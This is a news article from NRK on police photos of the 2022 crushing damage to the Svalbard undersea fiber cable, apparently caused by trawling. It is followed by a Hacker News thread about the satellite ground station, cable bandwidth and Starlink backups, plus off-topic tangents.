[
  {
    "id": 40484591,
    "title": "Exclusive Photos Reveal Crushing Damage to Svalbard Fiber Optic Cable",
    "originLink": "https://www.nrk.no/tromsogfinnmark/this-is-what-the-damaged-svalbard-cable-looked-like-when-it-came-up-from-the-depths-1.16895904",
    "originBody": "This is what the damaged Svalbard cable looked like when it came up from the depths Exclusive photos show the damage in detail. They may explain what happened, but the question of guilt remains. THIS IS THE PROBLEM: The police images show that the Svalbard fiber probably sustained crushing damage, says experts NRK has spoken to. A gap in the steel armoring exposed the cable itself. The weakened protection of the current bearing layer of the cable led to the ground fault that occurred. Foto: Politiet Send e-post til Journalist Håvard Gulldahl Journalist Send e-post til Journalist Inghild Eriksen Journalist Publisert i går kl. 16:56i går kl. 16:56 Oppdatert i dag kl. 04:41i dag kl. 04:41 Publisert i går kl. 16:56i går kl. 16:56 Oppdatert i dag kl. 04:41i dag kl. 04:41 The outermost layer is peeled off. The reinforcement is broken. For the first time in public, NRK can reveal what the Svalbard cable looked like after it was damaged on the night of 7 January 2022. Norsk Les en norsk versjon av denne artikkelen her. The tear enabled seawater to come into contact with a copper layer carrying electrical current in one of the two cables that together make up the Svalbard fiber. The current is used to amplify the fibre optic signals that flow through the 1300km long cables between the peninsula and the Norwegian mainland. Because of the breakage, the current went straight to ground, and the cable stopped working. It has not been previously established how the cable was damaged. Now, the photos might provide some clues. Initially, the police stated that they believed the damages were caused by human activity. Later on, the investigation was dropped, due to lack of evidence. The unique photos from the police investigation are now published for the first time. After an inital investigation, the police dropped the case due to lack of evidence, and inadequate legislation. Foto: Politiet Several experts with extensive experience with submarine cables and installations have assessed the images for NRK. Their judgement is that the damage to the Svalbard fiber was due to the cables being crushed. One of them is a manager in one of the larger companies in Norway that owns and operates communication cables on the seabed. He does not want to be identified, out of concern for the safety of his company's seabed cables. «It looks like there is damage to the outer jacket of the cable. This can happen if an anchor or a trawl is dragged across it. What does not seem to be present in the pictures, is a clear break or sharp deformation of the reinforcement around the cable, which could happen if you get stuck on a cable with a trawl or an anchor». Over the years, he has seen a number of cable incidents. He says it is difficult to determine the exact cause of the damage based on photos alone, but notes that there are no signs of it having been hooked by a dragged anchor, for instance. The police images shed light on what happened to the Svalbard cable on the night of January 7, 2022. The outermost layer is a protective coating made of nylon yarn impregnated with tar. It appears to have been peeled off. Foto: Politiet «By that reasoning, one might say that the pictures show damage after scraping or pinching by an object that has passed over or along the cable. This could typically be a trawl door or something that is towed along the sea floor.» Police prosecutor Ronny Jørgensen confirms that the police's technical report also identifies «pinching damage» as a possible cause of the malfunction. The area where the cable was repaired last year. Heavy trawling in the area when the cable damage occured Periodically, there is significant trawling activity in the area where the cable was damaged. If a vessel happens to trawl across a section of the cable that is not sufficiently buried, it is conceivable that the trawl doors , which weigh several tons, could pinch the cable against rocks or hard seabed. The Svalbard fibre is buried deep into the bottom sediments, ideally up to two meters. However, if the seabed is too hard, it may lie much more shallow, potentially at risk from bottom trawl activity. NRK has previously reported how a Russian trawler crossed the Svalbard cable more than 140 times, and more than a dozen times before the damage occurred in January 2022. The shipowners have denied having anything to do with the damage. The police questioned the crew was questioned by the police, and used underwater drones to film the seabed in the surrounding area. A recording shared with NRK shows deep tracks on the seabed that might originate from a trawler door. Police images from the seabed near Svalbard, filmed with an underwater drone, show the area where the damage occurred. The image is taken from the documentary series \"Putins Shadow War.\" Foto: Politiet The vulnerability of seabed cables The critically important cable that connects Svalbard to the mainland is no thicker than a pinkie finger. A steel wire reinforcement is spun around it for protection. The outermost layer is a nylon yarn inserted with tar. Cable damages occur many times each year, across the globe. This fiber link is one of many subsea cables worldwide that are crucial in their role to connect the world, but at the same time highly vulnerable. Where it might be possible to re-route traffic to another cable in well-connected parts of the underwater world, the incident outside in the remote Arctic peninsula revealed the fragility of the cable. It is critical for Svalbard's communication with the mainland, and a particularly important part of the Norwegian space infrastructure. The cable is also critical for Norway's international obligations, according to the Office of the Auditor General. The subsea cable surfaces just outside Longyearbyen on Svalbard. Foto: Jannicke Mikkelsen / NRK The damage to this cable is also one of the first well known incident in recent years where experts are drawing a possible connection to Russian hybrid warfare at sea. Compared to other cable damages Since that January night in February 2022, several other cable incidents have received significant international attention. On October 8, 2023, both a communication cable and a gas pipeline running between Finland and Estonia were torn off. Finnish authorities are still investigating the damage to the Balticconnector gas pipeline, while Estonian authorities are examining the damage to the Estonian-Finnish and Estonian-Swedish communication cables. They have concluded that the damage was caused by an anchor. Foto: Estonian Internal Security Service The cable break was investigated by Estonian authorities. They have concluded that the cable was torn off by a dragging anchor. «According to the main investigative version, the damage to the communications cables is connected to the vessel Newnew Polar Bear belonging to a Chinese company,» writes state attorney Triinu Olev in a statement to Estonian ERR and NRK. He writes that a joint Estonian and Finnish investigation has been investigating whether the damage was an accident or an intentional act. NewNew Polar Bear is currently in China. The same vessel has also been linked to similar cable breaks between Estonia and Sweden, and between the Russian cities of St. Petersburg and Kaliningrad. «We submitted a legal aid request to the Chinese authorities to gather evidence from the vessel and its crew. They have not provided a response as of yet,» he writes. Many damages to cables also occur without it becoming known to the general public. NRK has been in contact with several people involved with laying or repairing sea cables, in order to understand how the damage might occur. An owner of a large cable company, who does not want attention that can identify the damage or damage sites, says that fishing is the biggest cause of their cable problems. This is another instance of cable damage, occurring in 2017 and involving a Norwegian company. Experts consulted by NRK suggest that it is likely a trawl dragged the cable, causing damage to the outer layer, the armoring, and the inner tube where the actual fibers are located. «The typical damage we see on our marine fiber cables, is mechanical stress due to hooks from fishing. This probably accounts for more than 80 per cent of all damages we have seen. Not all damages have been possible to determine, but damage from bottom trawling and scallop fishing are the most common,» the technical director writes to NRK. Roughly speaking, the external damage to cables can be divided into three categories, explains Alaisdair Wilkie, chairman of the ACMA. The first is the influence of an external third party, such as anchors, trawls et cetera. The second category is natural impact, such as an earthquake, volcanic eruption or a tsunami. The third is wear and tear, or failure of the equipment itself. This image shows how such cables are constructed. The fibers are housed inside a tube in the center of the cable, which is then surrounded by armoring. «Anchor damage is very similar to trawl damage and it is really only the circumstances that tell us whether it was one or the other», writes Wilkie in an e-mail to NRK. Most often, it is hard to tell if cables have been damaged by intention. An example to the contrary is from 2021, when a research cable outside Vesterålen bore clear signs of being cut. The police has stated that this cable appears to have been cut, after it had been hooked. The marks on the cable resemble that of an angle grinder. Foto: Troms politidistrikt A 40 hour long operation Jens Olav Frorud is a consultant at Space Norway, the company that owns and operates the fiber connection. He will not speculate on how the damage to the Svalbard fiber occurred. However, Frorud will speak about how they found and repaired the damaged cable in June of last year. Jens Olav Frorud, aboard the \"Cable Vigilance,\" was one of the first to closely inspect the damage. Foto: Dave/ASN He was on board the «Cable Vigilance» during the month-long and complicated cruise that retrieved the cable from the depths, and repaired it in an extensive operation. After 40 hours they had found the damage. There was no doubt, says Frorud. How so? «One could easily see the signs of this. It was about the area where the damage was. So, it was obvious. You could see the external damage.» The subsea cable surfaces just outside Longyearbyen on Svalbard. Foto: Jannicke Mikkelsen / NRK Executive Director Rune Jensen of Space Norway says the damage to the Svalbard cable shows how vulnerable fiber connections on the seabed are. «There has been given greater attention to underwater infrastructure, in particular after the events that have taken place in our neighbouring regions. The Svalbard cable is also part of that picture. Not only in Norway, but also in Europe and on several other continents.» The cable is hauled aboard for repair. Two shifts totaling fifty individuals worked day and night to replace the damaged section. They also brought along remotely operated underwater vehicles (ROVs) and equipment for splicing the fiber. Foto: Jens Olav Frorud, Space Norway Should something similar happen again, Space Norway has now joined ASN, an organization that gives rapid access to cable repair ships, crew and equipment. «Space Norway acknowledges the conclusion of the investigation. The police cannot prove that this was as a result of human activity. So, we have taken note of that conclusion, and we are not speculating further,» says Jensen. Additional reporting by Anna Pihl from Estonian National Broadcasting Company. Translation into English by Arnstein Friling and Håvard Gulldahl Publisert i går kl. 16:56i går kl. 16:56 Oppdatert i dag kl. 04:41i dag kl. 04:41",
    "commentLink": "https://news.ycombinator.com/item?id=40484591",
    "commentBody": "What the damaged Svalbard cable looked like (nrk.no)508 points by ingve 23 hours agohidepastfavorite212 comments bjornasm 11 hours agoJust in case why people are wondering why cutting of internet for an arctic island is a big deal. What many might not know is that Svalbard is home to the northernmost satellite station in the world. It is just one of two stations that can communicate with polar orbiting satellites each day. ESA and NASA as well as other civilian organisations are present there, and the station communicates with well over a hundred satellites, and are pretty vital for much of the satellites that look back at us. reply Sanzig 4 hours agoparentTo be pedantic - most places on Earth can get a contact with a polar orbiting satellite at least once or twice per day, however the number of contacts per day increases the closer you get to the poles. Svalbard is far enough north that you get lots of contacts per day. I forget the exact number and I don't have STK open in front of me to simulate it, but from memory it's something like 15 or so contacts per day for a typical earth observation orbit. This gives you lots of data and relatively frequent contacts to maximize the freshness of the imagery. There are tons of commercial observation satellite operators that use Svalbard for downlink (downlinks at Svalbard can be procured commercially through a company called KSAT which operates the station). Ukraine has been purchasing a lot of imagery from these companies, including both optical and radar imagery. If I had to hazard a guess at a possible motive, that'd be it. reply bjornasm 4 hours agorootparentThx, that was a huge brain fart, I meant each revolution. reply bjornasm 4 hours agoparentprevCorrection: not one per day, one per revolution. Since the satellites go from north to south pole while the earth is spinning, the polar areas is the inly the pass each time. reply mgoetzke 8 hours agoparentprevTime for a Starlink backup then reply partomniscient 6 hours agorootparentIts the groundstation that needs backing up and the location is surrounded by the sea. reply ViewTrick1002 6 hours agorootparentWhich Starlink solves utilizing the laser links between satellites. reply tedivm 4 hours agorootparentYou're grossly underestimating the bandwidth needs of the site. You're not going to replace a cluster of fiber optic cables with Starlink. reply ViewTrick1002 3 hours agorootparentWe're talking backup vs. primary. Of course the backup is not going to be as good. reply tedivm 3 hours agorootparentStarlink has an upload speed between 5 and 20 Mbps. The Svalbard cable is a 10Gbps link. It's still a major difference. That said apparently they do have a satellite backup, just not through Starlink. reply ViewTrick1002 3 hours agorootparentFor a consumer grade connection. Why on earth would an enterprise contract be limited to those speeds?? reply sandworm101 3 hours agorootparentprev>> We're talking backup vs. primary. Of course the backup is not going to be as good. Then it isn't really a backup. A lower-bandwidth failover capacity is properly described as an alternative or degraded pathway. To be a proper \"backup\" a thing has to actually do the primary job at least temporarily. reply inemesitaffia 4 hours agorootparentprev10 Gbps in Ka and 100 in E band reply sunbum 6 hours agorootparentprevThat's not how satellites work. reply ViewTrick1002 6 hours agorootparentStarlink can act as a backup for the ground station utilizing the laser links. reply chtitux 3 hours agorootparentMaybe just use Starlink from the satellites, so we don't rely on a specific ground station. Starlink Ground Station Network is global, spread in many different countries and look more resilient than a single one. reply tedivm 3 hours agorootparentThat would require replacing all the satellites with new ones capable of doing that, which doesn't seem feasible. Starlink also doesn't have great coverage of the polar regions. reply cbeach 41 minutes agorootparentStarlink's laser system is already up and running. Back in January it was delivering over 42 petabytes per day: https://uk.pcmag.com/networking/150673/starlinks-laser-syste... “We're passing over terabits per second [of data] every day across 9,000 lasers,” SpaceX engineer Travis Brashears said today at SPIE Photonics West, an event in San Francisco focused on the latest advancements in optics and light. \"We actually serve over lasers all of our users on Starlink at a given time in like a two-hour window.” reply amarant 3 hours agorootparentprevIt's a good idea for future satellites, but upgrading existing satellites is probably not feasible. And these polar orbit satellite typically live a lot longer than the relatively short lived starlink satellites, potentially opening you to a (perhaps unlikely?) scenario where starlink moves to new and incompatible hardware for inter-satellite communications, and your satellite is then made obsolete. Vertical integration is not cheap, but it does have it's upsides. reply paganel 2 hours agoparentprevMost probably Russia will claim sovereignty over all of the Svalbards after the next big war and redrawing of borders, Stalin was too circumspect in not scaring the Americans into WW3 the first time when they had the chance to do it. All that because whoever controls the North Pole controls most of the Northern Hemisphere, it’s actually one of the very few “ways in” inside North America and control of the continental United States (there were a few US geopoliticians/geographers who first became aware of that in the early 1940s). reply neffy 2 hours agorootparentI for one welcome our new Polar Bear Overlords. (Hope the Russians don´t forget their rifles when they move in.) reply paganel 12 minutes agorootparentI thought this forum still wanted to be on the serious side, so under that view look at the works of George T. Renner, in particular his World Map for the Air Age, published in 1942-1943. [1] [2] As air-power started to be taken seriously with the advent of WW2 (some) geographers started realising that one of the shortest way of getting from Europe to North America is via the North Pole, or close to it, anyway. Hence those maps I've linked to, which had the North Pole at their center, and that is because Renner thought that the control of the North Pole was similar to the control of the Northern Hemisphere. Related, a little bit later on ICMBs were meant to take the same route, give or take, hence why NORAD became a thing. But, again, we can choose to take the \"lol! lol! lol! The Russians and their shovels!\" angle, which won't benefit anyone involved in this conversation, intellectually speaking. [1] https://www.worthpoint.com/worthopedia/vintage-renner-world-... [2] archive.org link that should work, but doesn't: https://archive.org/details/dr_rand-mcnally-world-map-for-th... reply cjrp 12 hours agoprevRussian trawlers going back and forth in that area… https://x.com/PerErikSchulze/status/1794828268480438514 reply the_gipsy 11 hours agoparentWhile this looks alarming and makes an engaging tweet, I have no idea how regular trawling patterns look like. They might circle around fishing spot. reply thaumasiotes 10 hours agorootparentDave Barry made a similar observation about antismoking PSAs, objecting to one that had someone throw a diseased lung on a table. He pointed out that you could present any random internal organ and it would look just as bad: \"This is what will happen to you if you keep smoking. Look! A perfectly healthy goat kidney!\" reply iopq 9 hours agorootparentI think what had a big impact on me is they show both a healthy lung and a smoker's lung reply Shrezzing 9 hours agorootparentThis was the big one for me too. The juxtaposed healthy versus unhealthy lungs resemble an uncooked chicken versus a roast chicken which was left in the oven for 30 minutes more than necessary. https://www.scotsman.com/webimg/legacy_elm_28724349.jpg?crop... reply thaumasiotes 8 hours agorootparentThe antismoking PSA that made the strongest impression on me, by far, was the one that showed a grandfather encouraging a baby to take a step. Eventually, the baby starts walking, and rushes over to the grandfather. And through the grandfather, who fades to translucency. It wasn't just me; that PSA made enough of a splash that it was called out on Friends. I've tried to find that PSA in the past, but with no success. Once I asked a friend if they could find it, and the response was \"Oh, I know exactly the one you're talking about. I won't help you look for it. I hate that commercial and I don't want to see it again.\" Looks like it's made it onto youtube by now in glorious 240p: https://www.youtube.com/watch?v=O6pb6XxrbmE I note that the second comment is \"This commercial was what made my father stop smoking.\" It's interesting to think about the balance between disturbing the smoking audience so strongly that they stop, and disturbing the non-smoking audience so strongly that they complain about being exposed to your traumatic imagery and imperil your funding. reply IndySun 7 hours agorootparentprevRelated, I was struck by a comment made by the respiratory specialist doctor Martin Tobin, during the George Floyd murder court case. He said less than 10% of smokers actually go on to get 'issues'. He was pushing back on the line that as a smoker, George Floyd was more prone to react badly to 'having a knee on his windpipe...' you know the rest. I did rewind and listen again then look up what he was saying and indeed, my assumed knowledge of smoking was altered. Apologies for my vagueness with 'issues', I don't want to under or over state what he said and right now I can't locate the exact sentence within the days of testimony. This man... https://archive.is/x5MRY reply IndySun 3 hours agorootparentFor anyone curious, I found the relevant sentence. An astonishingly counterintuitive almost throwaway remark by a world's expert sent me on a deep dive on what else can and does cause lung problems. Dr Martin Tobin says it at 3h 02m 40s... https://www.c-span.org/video/?510467-1/derek-chauvin-trial-d... reply alexeldeib 2 hours agorootparentWhat was your takeaway? Any added insights/reading? reply IndySun 10 minutes agorootparentI am aware there is a lot of complexity (obviously) in why people develop lung cancer, or any illness for that matter, but within that assumption was smoking being far worse than it actually is. Reading further, and this may also seem obvious written out in this simple form, the cancer numbers for people in homes using coal burning for cooking food varies hugely depending on the coal. And that the incidence of lung cancers in 'never-smokers' is rising rapidly globally. reply ikiris 1 hour agorootparentprevRadon is scary, and surprisingly everywhere in some regions. reply exitb 1 hour agorootparentprev10% aren’t low odds when it comes to health issues. reply ltbarcly3 5 hours agorootparentprevThats what they do. Those lungs are fake, sold by medical supply companies. They just take a healthy pig lung and dye it black and burn holes in it for \"tumors\". You can google for places to buy them. reply mgoetzke 10 hours agorootparentprevnext [2 more] [flagged] HenryBemis 9 hours agorootparentPlausible deniability because it works. As for the fishermen in that boat.. yeah.. totally innocent fishermen, and on that very spot they hit a 'school' of that one fish they were looking for, so they are fishing this 'school' and nothing else sinister going on keep walking (omitting commas on purpose) reply goodcanadian 9 hours agoparentprevThat's what trawling is . . . it is completely normally for a trawler to go back and forth like that. reply LysPJ 9 hours agorootparentBut not over a cable. Submarine cables are clearly marked on nautical charts, and even recreational boaters know not to anchor in those areas. A professional trawler captain is not going to accidentally trawl over such an area. reply vidarh 5 hours agorootparentThere's a big difference in seriousness between being able to show whether they were likely doing something they shouldn't be doing for the sake of making more money on the fishing, vs. if they were doing what they were doing with the intent of causing damage, though. But of course, that difficulty is also exactly why it'd also be a great way for an adversary to damage your cables. reply AlecSchueler 6 hours agorootparentprevFishers are infamous for flaunting the rules though. I think we can only judge this if we see records of other ships in the area. reply giarc 6 hours agorootparentYou can, at least at that specific time that all other boats were not trawling over cables. reply csmpltn 6 hours agoparentprevIs that boat trawling directly over the same area where the cables were damaged? Unclear from the tweet alone... reply silverlyra 45 minutes agorootparentyes – the trawling pattern in the GIF is over (part of) the area marked as damaged in the NRK article: https://www.nrk.no/tromsogfinnmark/this-is-what-the-damaged-... reply dredmorbius 7 hours agoparentprevnext [–]reply rasz 8 hours agoparentprevI mean, clearly \"lack of evidence\"! >After an inital investigation, the police dropped the case due to lack of evidence, and inadequate legislation. reply next_xibalba 22 hours agoprev> The critically important cable that connects Svalbard to the mainland is no thicker than a pinkie finger This is amazing. I wonder how much data per unit of time this is capable of transporting. Wikipedia says \"Each segment has a speed of 10 gigabits per second (Gb/s), with a future potential capacity of 2,500 Gbit/s.\" [1] Wikipedia also notes that NASA helped fund this system. [1] https://en.wikipedia.org/wiki/Svalbard_Undersea_Cable_System reply varenc 19 hours agoparent> I wonder how much data per unit of time this is capable of transporting. The max throughput of fiber optic cables isn't exactly constant. As fiber optic modem and DSP technology improves you can get much higher speeds on 15+ year-old cables than were ever possible when they were laid. Recently I saw an article about researchers getting 300,000 Gbit/s over existing fiber optic cables (though I'm sure that's a long way from being a deployable technology): https://www.aston.ac.uk/latest-news/aston-university-researc... reply colmmacc 16 hours agorootparentThe Shannon limit is constant if you assume reasonable but idealized SNR values for the medium, and gives you a real \"law of physics\" upper limit ... typically still many orders of magnitude beyond what we can transmit today. But it's amazing how effective DSP can be; trellis coding managed to get modems to squeeze right up to the Shannon limit of POTS telephone connections. reply SideQuark 8 hours agorootparent> The Shannon limit is constant if you assume reasonable but idealized SNR values for the medium The Shannon limit is changed by changing technology over the medium, not the other way around. If you signal with light on/off pulses, you get one limit. If you add polarization tricks (using different physical properties and tech), you get another limit. As you add QAM and a zillion other tricks, you get another channel limit. If you add quantum superdense coding, you get another channel limit. Each of those, until we learned there is yet another layer of physics and tech, would be \"the Shannon Limit.\" All of these can be done on the same medium. The Shannon limit is a mathematical *model* of a channel. It's not a physical/technological limit. Here [1], for example, is a paper pointing this out for transoceanic undersea optical cables. \"As pointed out in Section 9.3, the Shannon limit is only limiting if we assume there is no technical way to further improve the QoT...\" Technology changes routinely change the \"Shannon Limit,\" since that limit has almost nothing to do with physics. Physics and the signaling technology define a Shannon Limit for that particular channel combination, nothing more. [1] https://www.sciencedirect.com/topics/engineering/shannon-lim... reply SAI_Peregrinus 16 hours agorootparentprevThis applies to single-mode cables, but much less to multi-mode cables. Of course long-distance cable like this is always single-mode, but it's worth keeping in mind if building a fiber network inside a building. reply a20eac1d 1 hour agorootparentCan you use single mode fiber in a house, or do the transceiver only work over much longer distances? Is transceiver burn out an issue? reply jtriangle 58 minutes agorootparentYou can use SM for short runs, you just have to match the optics to the cable/distance you're looking to use. Tons of very fast single mode optics out there that only expectA relatively high-powered beam of light is mixed with the input signal using a wavelength selective coupler (WSC). The input signal and the excitation light must be at significantly different wavelengths. The mixed light is guided into a section of fiber with erbium ions included in the core. This high-powered light beam excites the erbium ions to their higher-energy state. When the photons belonging to the signal at a different wavelength from the pump light meet the excited erbium ions, the erbium ions give up some of their energy to the signal and return to their lower-energy state. https://en.wikipedia.org/wiki/Optical_amplifier reply wiml 13 hours agorootparentprevI think they're mostly laser amplifiers these days. So they're agnostic to modulation or WDM. But I assume there's still a noise/gain tradeoff. reply nradov 14 hours agorootparentprevYou're referring to single continuous fiber optic cables on land. Long undersea cables incorporate powered repeaters. Those can't be upgraded in situ with improved technology. reply doikor 10 hours agorootparentThey can just not really worth the hassle/money. You can pull the cable up and change them out if you want. Pulling a cable up, cutting a damaged part out of it and putting a new piece in is done all the time to fix damaged cables. reply Scoundreller 22 hours agoparentprevI think NASA helped fund it because they wanted more (And more reliable) data to a groundstation on the island, not because this subsea cable is anything special. Fibre optic is great because you can usually add more bandwidth by lighting up another wavelength. The amplifiers don't need to be substituted if the wavelength is within its range. reply _zoltan_ 21 hours agorootparentI've wondered in the past: is there an actual theoretical upper limit based on the physicality of it on the bandwidth of a single fibre link? reply dboreham 21 hours agorootparentShannon bound. But it's very large. I don't think we're anywhere close with current DWDM emitter/detector technology. reply cycomanic 20 hours agorootparentActually we know that a single mode fibre (there would typically quite a lot of them in a cable) can carry around 100 Tb/s in the C band (used by most systems due to amplifier availability) over about 100km. Research systems have reached that limit and commercial systems are not very far off. reply oh_my_goodness 20 hours agorootparentIs that right? The C band is only 4 or 5 THz wide, so that's impressive packing. (I'm way out of date, I know there is QAM and whatever.) reply cycomanic 12 hours agorootparentFor the super high capacity demonstrations, 256 QAM and/or probabalistic/geometric shaping is typically used so we get to about 12 bit/s/Hz (accounting for FEC and pilot overheads). Interestingly, data rates are mainly limited by the transceivers (RF amplifiers, DAC/ADC ENOB... is not that great at 25-100GHz, which is required for the 50+Gbaud symbol rates). reply pezezin 18 hours agorootparentprevModern DWDM systems use a channel spacing of 75/100 GHz, so you easily fit more than 50 channel in a single fibre. reply candiddevmike 21 hours agorootparentprevOS2 single mode fibre is pretty future proof. The transceivers may change, but the underlying cable should last a looong time and can be sliced and diced considerably with WDM (16+ channels AFAIK). reply Hikikomori 22 hours agoparentprevLocals liked to say they had the best internet connection in the worlds, idk about that. NASA is a customer of the satellite station there. reply mvkel 17 hours agoparentprevWait, an entire mainline for a country can do 10Gb/s and people somehow are paying for gigabit home Ethernet? Either the former is understated, or the latter is way overkill. Or, I'm misunderstanding. Which is probably the most likely possibility. reply saithound 16 hours agorootparentSvalbard is not a country, but a remote archipelago of Norway. The main island, Spitsbergen has a population of 2.5k people, they don't allvuse the Internet (certainly not all at the same time), and they do not pay for gigabit home internet, more like 75Mbps. For reference, the Southern Cross fiber network connecting Australia to the U.S. does more like 10+ Tbps. reply ocdtrekkie 16 hours agorootparentAll of this but also even in the case of bigger lines, a lot of home Internet traffic is not routed globally if you can avoid it. CDNs cache content on the same physical continent as much as possible, things like Netflix are usually streamed from your local ISP. A lot of traffic over the Internet is extremely unexciting things like Windows updates as well, which are generally globally served by a CDN (or even peer to peer sharing from other Internet users nearby). reply guappa 13 hours agorootparentBefore https anyone could put a proxy and cache content. reply Tor3 15 hours agorootparentprevI'm not sure where they got that number from, but when the two cables were put there many years ago the stated capacity at that time was 40Gb/s for each of the cables (though that capacity was not meant to be used at full back then). Source: I worked on the network setup that was going to be used by NASA. (The main funding of this cable was not NASA, but in any case it was used by NASA to replace a much slower and more complicated satellite link) reply EKS1 16 hours agorootparentprevsvalbard is a island, far away from mainland. Not many live there (3k people). But they likely have higher seasonal numbers (Tourists) https://www.openstreetmap.org/#map=5/77.504/13.008 reply svnt 15 hours agorootparentprevEach individual fiber, which is a fraction of a cubic mm in cross sectional area, can provide this much bandwidth in a fairly trivial low-cost configuration. Cables like the one pictured carry many of these fibers. reply Kon-Peki 21 hours agoprevWhat, no mention that the Norwegian police use evidence markers with inches printed on them? That company sells them with CM markers. reply new23d 20 hours agoparentProduct appears to be an ID Tent from Evi-Paq. It has inches on the front 'leg' and cms on the rear. https://forensicssource.com/collections/evidence-markers/pro... reply Aurornis 20 hours agoparentprevScroll down to the lower images. They have both inch and centimeter measurements on other photos. It's more likely that they take photos with both measurements. reply alufers 20 hours agoparentprevSome gun calibers are measured with inches, so maybe they have some imperial markers on hand to measure bullet casings? reply eru 14 hours agorootparentMany measuring devices used in eg Germany have both proper units and Freedom units printed on them. It's probably just easier to have one model that you can sell anyone on the globe. Economics of scale and all that. reply vidarh 5 hours agorootparentI'm Norwegian, and it's very common in Norway as well to have e.g. rulers and other measuring devices with both inches and metric units. It's if anything pretty rare to have just one or the other unless it's a \"format\" where displaying both affect usability - e.g. make the writing too small. reply lobochrome 20 hours agoparentprevOdd indeed. I would assume the salvage company was American? reply rwmj 21 hours agoparentprevnext [24 more] [flagged] tadfisher 20 hours agorootparentThat line of thinking ultimately leads to the conclusion that trust is impossible. If you cannot trust the Norwegian police to produce accurate information, then you must trust the media. If you can't trust the media, then you have to trust strangers on the Internet. If you can't trust strangers on the Internet, you have to trust your friends and family. But what if they're informed by the corrupt police, media, or Internet commenters? Can you even trust yourself? Apply this logic elsewhere, and you cannot trust social institutions; for example, your local human services department when they come to warn you about your domicile being unfit for human habitation. Next, you can't trust the medical profession after you've been involuntarily committed to a mental institution after threatening the local schoolchildren (although we all know you were only warning them about the coming danger). You can't trust the state medical authority to regulate the medication that is used to treat paranoid schizophrenia. Now you're stuck in a padded room, unable to move your arms to scratch that incessant itch on your nose, pleading with your caretakers to just listen to reason, open their eyes to the truth. All you wanted to do was alert the world to the alarming fact that the United States obviously staged evidence that someone intentionally cut an undersea communications cable to Svalbard, Norway on the 7th of January, 2022. reply pessimizer 20 hours agorootparentYou're not making a logical argument against the reasoning, you're just saying that a logical argument, ignoring probability at every level, leaves you helpless. Trusting things isn't a solution, it's a cop-out. Instead of a magic formula, you take things on a case-by-case basis, examining sources and possible motives of those sources, looking at past experience with them for hints. This sounds like work because it is. It's very easy to just accept what you're told, but it's not heroic or even reasonable. > All you wanted to do was alert the world to the alarming fact that the United States obviously staged evidence that someone intentionally cut an undersea communications cable to Svalbard, Norway on the 7th of January, 2022. Meanwhile, the United States government is like \"that line of thinking ultimately leads to the conclusion that trust is impossible.\" reply tadfisher 17 hours agorootparentI am describing the line of reasoning which connects \"these photos have Imperial measurements\" to \"the United States is orchestrating the press release\". Please illustrate how this reasoning—given the evidence and our shared reality—demonstrates critical thinking, drawing on past experiences, or examining sources; you know, the stuff that sounds like work. reply MeImCounting 20 hours agorootparentprevThere is in fact a line between using discretion and critical thinking and falling prey to paranoid superstition. This is important because there are people who prey specifically on people who are vulnurable to conspiratorial thinking and they are very good at it. For about half the population of the US right now if the Daily Wire or like Joe Rogan came out and said that refrigerators are a deep state conspiracy that has been transing the kids, that would be it. No more refrigerators. There would be piles of refrigerators miles high at landfills across the country and having cold drinks would be a sure sign youre a corrupted liberal. reply YZF 19 hours agorootparentThe thing about most conspiracies is that they need to have some \"marginal plausibility\" (I just made that term up). The refrigerator example seems going a bit too far. Hormones in milk might do the trick though. Cold drinks like Pepsi and Coke definitely have some potential. Also rather than not having cold drinks going back to using ice boxes is probably the better option. More seriously, we do live in a complex world, we can't function without trust but we also have to be open to changing our opinions based on new evidence. I'm just reading \"How to talk to a science denier\" and it's got some interesting takes on these topics. reply Vegemeister 16 hours agorootparentSeeing as \"(leaky and scrapped) refrigerators are damaging the upper atmosphere, allowing ionizing UV to reach the ground and cancering the everyone,\" actually happened and AFAIK is disputed by almost nobody, it's not that implausible. Hormones in milk is more plausible still because hormones are known to do that kind of thing, but the main knock against the refrigerator idea is that we already have fairly strong protections against leaky fridges because of the ozone. reply jonathankoren 18 hours agorootparentprev>The thing about most conspiracies is that they need to have some \"marginal plausibility We literally had a wide spread conspiracy about secret DNA editing viruses that were controlled by 5G cellular antennas, because They™ wanted to mind control people and make them sterile for population replacement by Them™. I’d say that it’s not about being plausible in any sort objective sense, but rather a successful conspiracy theory must reinforce existing beliefs and biases. See also: Ultraterrestrials, and UFOs as satanic entities battling Jesus. reply YZF 17 hours agorootparentWell, virus can change your DNA. Cell phone towers being everywhere with people not generally understanding how they work or whether they pose health risks is another thing. You need to tell a story that the layman can't readily refute. Crazy government scientists engineering viruses that can be remote controlled by radio signals is \"marginally plausible\". The fridge story IMO doesn't qualify. There's another category of fables I'd call \"religious fables\". Those are ones that can't be falsified. Feels like your other examples fit in those. Religious people believe all sort of things in these categories. They're not really related to the factual reality. This is different IMO from your run of the mill conspiracy theory because those generally have enough counter-evidence where you can make a reason/logic based assessment of the probability of true vs. false. An analogy is flat earthers pointing to some \"evidence\" that in their mind supports the idea that the earth is flat while ignoring the bulk of evidence demonstrating it's not. Even if you do not have the ability to directly observe whether the earth is flat or not you can weigh the evidence. It's true religion and conspiracy often intersect. Religion by its nature is belief without facts. reply Retric 14 hours agorootparentI don’t think people actually understand refrigerators any better than cellphones which are 41 years old at this point. Create some story about the “hum” of an air compressor being linked to declining birth rates or whatever and someone will believe it. Keep harping on it long enough and it goes from a fringe idea to vaguely plausible surprisingly quickly. Just look at the Anti Vax movement and those are well over 200 years old. reply YZF 13 hours agorootparentThe number of people that understand the details of how a refrigerator works is orders of magnitude higher than the number of people the really understand everything about cellphone technology. But yeah, the hum is not pleasant, has that been studied? ;) I feel like for something to stick there does need to be more than that. But who knows, give it a try and see! If you look at the common conspiracies they seem to target more complex things. Anti-vax is a lot more complex. There was Andrew Wakefield's fraud. There are real side effects for many vaccines. There are public health considerations. The science is definitely not at a fridge level. Pharma companies can have conflicts of interest. Maybe the original cowpox gives immunity to smallpox is more intuitive but mRNA vaccines that cause cells to make the Covid spike protein are not as simple. Covid vaccines were rushed to market (one can argue for good reasons) and they did have side effects (e.g. myocarditis, tinnitus?). Authorities have walked the line of being open about the considerations vs. trying to force public health policies, sometimes eroding trust while they do that. Even experts differed on some finer policy points. I know I was really upset with people who didn't vaccinate for Covid because I believed we could get herd immunity but then new variants showed up that were so more infectious and got around the vaccine where that didn't matter. reply Retric 6 hours agorootparent> understand the details… really understand everything That’s two different standards, and only relevant if either of them was a significant percentage of total population. Most people don’t even understand why a refrigerator door gets briefly stuck after you close it. It’s practically a magic box that gets cold which is perhaps why they fall for conspiracy theories so readily, any explanation is equally plausible. And sure at a high level I understand both, but to really 